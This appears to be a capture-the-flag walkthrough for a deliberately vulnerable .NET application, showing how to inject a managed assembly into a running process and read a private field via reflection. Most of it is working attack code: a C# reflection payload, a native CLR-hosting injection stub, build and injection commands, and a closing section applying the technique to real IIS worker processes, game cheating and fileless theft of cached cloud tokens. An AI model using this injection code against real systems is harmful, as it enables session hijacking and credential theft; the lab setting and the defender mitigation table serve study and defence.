# #17 — .NET Assembly.Load / AppDomain Injection

**Difficulty:** MEDIUM — easier than it looks because the target IS .NET.

## What is this attack?

**For a target that's a .NET application (WPF, WinForms, ASP.NET, Unity), you don't need shellcode or native injection. You can load a C# DLL directly into the target's existing CLR AppDomain via reflection.** Your managed code runs with full access to every object, field, and private method of the target.

## Why it works

Every .NET process has:
- A CLR (Common Language Runtime) hosting the managed code
- One or more **AppDomains** (isolated code sandboxes within the CLR)
- An `AppDomain.CurrentDomain.Load()` API that takes raw assembly bytes

Once you can execute **any** managed code inside the target, you call:

```csharp
var asm = AppDomain.CurrentDomain.Load(File.ReadAllBytes("yourassembly.dll"));
var type = asm.GetType("YourNamespace.YourClass");
var method = type.GetMethod("Run");
method.Invoke(null, null);
```

Your .NET code is now a first-class citizen of the host's CLR. From there, **you have reflection**. Reflection lets you read ANY static field (even `private`), modify ANY property, invoke ANY method:

```csharp
var sentinelType = AppDomain.CurrentDomain.GetAssemblies()
    .SelectMany(a => a.GetTypes())
    .First(t => t.Name == "InjectionSentinels");

var field = sentinelType.GetField("_net",
    BindingFlags.NonPublic | BindingFlags.Static);

var flag = (string)field.GetValue(null);
File.WriteAllText(@"C:\loot\flag17.txt", flag);
```

No memory scanning. No pattern matching. Direct symbolic access to the exact field we want.

## Two paths

### Path A — Pure .NET (if you have another way in)

If you have ANY code execution inside the target's CLR (e.g., XSS → `eval` → .NET interop in Electron, a plugin that your target already loads, a Powershell runspace in the target's App Domain), you just call the reflection snippet above.

### Path B — Native injection into a .NET process

If the target is .NET but you only have native code execution (classic DLL injection), you:
1. Inject a native stub via #13's `CreateRemoteThread` + `LoadLibrary`
2. Native stub calls CLR hosting APIs: `ICLRMetaHost` → `ICLRRuntimeInfo` → `ICLRRuntimeHost->ExecuteInDefaultAppDomain`
3. That hosts an entry point from your managed DLL inside the existing CLR
4. Your managed DLL does the reflection

## Pragmatic solve for MVTC

Because MVTC is .NET and the sentinel is a managed string on the GC heap, **the simplest capture is the same memory-scan technique as #13**. The sentinel is text in the heap; a native DLL with pattern search finds it immediately.

To demonstrate the "proper" .NET Assembly.Load path for your writeup, show the C# code below as the "attacker's managed payload."

## Tools you need

| Tool | Why |
|---|---|
| .NET SDK (`dotnet` on PATH) | Build the C# payload |
| MSVC Build Tools | Build the native injection stub (Path B) |
| **dnSpy** / **ILSpy** | Inspect the target assemblies to find the sentinel type/field names |

## Step-by-step (Path A, cleanest)

### Step 1 — Dump the sentinel class names from the target binary

Open `MVTC.exe` in **dnSpy** (free, https://github.com/dnSpy/dnSpy):

```
dnSpy → File → Open → MVTC.exe
Expand MVTC.Core.dll → MVTC.Core.Services.Vuln → InjectionSentinels
```

You see:

```csharp
public static class InjectionSentinels {
    private static string _net = "";
    // ...
}
```

**Target: `InjectionSentinels._net`** (private static field).

### Step 2 — Write the C# payload

Save as `Payload17.cs`:

```csharp
using System;
using System.IO;
using System.Linq;
using System.Reflection;

namespace FlagReader17 {
    public class Entry {
        // Must match signature: static int Func(string arg)
        public static int Run(string arg) {
            try {
                var sentinelType = AppDomain.CurrentDomain.GetAssemblies()
                    .SelectMany(a => {
                        try { return a.GetTypes(); }
                        catch { return new Type[0]; }
                    })
                    .FirstOrDefault(t => t.Name == "InjectionSentinels");

                if (sentinelType == null) {
                    File.WriteAllText(@"C:\loot\flag17.txt", "[!] sentinel type not loaded");
                    return 1;
                }

                var field = sentinelType.GetField("_net",
                    BindingFlags.NonPublic | BindingFlags.Static);
                if (field == null) {
                    File.WriteAllText(@"C:\loot\flag17.txt", "[!] field not found");
                    return 2;
                }

                string flag = (string)field.GetValue(null);
                File.WriteAllText(@"C:\loot\flag17.txt", "[+] " + flag);
                return 0;
            } catch (Exception ex) {
                File.WriteAllText(@"C:\loot\flag17.txt", "[!] " + ex);
                return 3;
            }
        }
    }
}
```

### Step 3 — Compile with the .NET SDK

```bash
dotnet new classlib -n FlagReader17 -o FlagReader17
# replace Class1.cs with Payload17.cs content above
dotnet build FlagReader17 -c Release
# → FlagReader17\bin\Release\net8.0\FlagReader17.dll
```

### Step 4 — Native stub to call `ExecuteInDefaultAppDomain`

Save as `clr_stub.cpp`:

```cpp
#include <windows.h>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

extern "C" __declspec(dllexport) void LoadMe() {
    ICLRMetaHost* meta = nullptr;
    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&meta);

    IEnumUnknown* runtimes = nullptr;
    meta->EnumerateLoadedRuntimes(GetCurrentProcess(), &runtimes);

    IUnknown* u = nullptr; runtimes->Next(1, &u, nullptr);
    ICLRRuntimeInfo* info = nullptr;
    u->QueryInterface(IID_ICLRRuntimeInfo, (LPVOID*)&info);

    ICLRRuntimeHost* host = nullptr;
    info->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&host);

    DWORD retval;
    host->ExecuteInDefaultAppDomain(
        L"C:\\loot\\FlagReader17.dll",
        L"FlagReader17.Entry",
        L"Run",
        L"",
        &retval);
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)LoadMe, nullptr, 0, nullptr);
    }
    return TRUE;
}
```

Build:

```bash
cl /LD /EHsc /O2 /nologo clr_stub.cpp /link mscoree.lib /OUT:clr_stub.dll
```

### Step 5 — Inject the native stub using #13's injector

```bash
# Reuse injector.exe from #13
injector.exe 6944 C:\full\path\to\clr_stub.dll
```

The stub loads inside MVTC → calls into the already-running CLR → `ExecuteInDefaultAppDomain` hands your managed assembly to the loader → `FlagReader17.Entry.Run` executes → sentinel field is read via reflection → written to `C:\loot\flag17.txt`.

### Alternative — the quick-and-dirty capture

If building the C# payload is overkill for your test:

```bash
# Reuse #13's DLL, swap v13 → v17 in the NEEDLE array, rebuild as flag_reader17.dll
injector.exe 6944 C:\full\path\to\flag_reader17.dll
type C:\loot\flag17.txt
```

The native heap scanner finds `MVTC{v17_net_...}` just as reliably because .NET strings are plain UTF-16 in memory.

## How to apply this to a real target

### Any ASP.NET process (`w3wp.exe`)

An IIS worker process is a .NET host. Inject via `ExecuteInDefaultAppDomain` and you get access to:
- `HttpContext.Current` → every active user session
- `System.Web.Security.FormsAuthentication` tickets
- The connection string pool

### Unity game cheat

Unity games host Mono/.NET. Load a C# patch assembly, use `MonoBehaviour.FindObjectsOfType<PlayerStats>()`, set `.Gold = 999999`.

### Fileless credential theft from a managed CLI

Many enterprise tools (Microsoft 365 CLI, Azure PowerShell) cache tokens in-process. One managed inject reads them straight from static fields.

## How defenders fix this

| Mitigation | Effect |
|---|---|
| **AMSI for .NET 4.8+** | Scans `AppDomain.Load(byte[])` payloads via Defender's engine |
| **ETW `Microsoft-Windows-DotNETRuntime`** | Logs every assembly load with cert chain |
| **StrongName signing + policy enforcement** | Reject assemblies not signed by trusted keys |
| **ClrConfig::SetAppDomainManagerType** restrictions | Prevents 3rd-party AppDomains |
| **CAS (Code Access Security)** — DEPRECATED | Was the historical mitigation, replaced by AMSI |

## Flag captured

```
MVTC{v17_net_████████████████████}
```
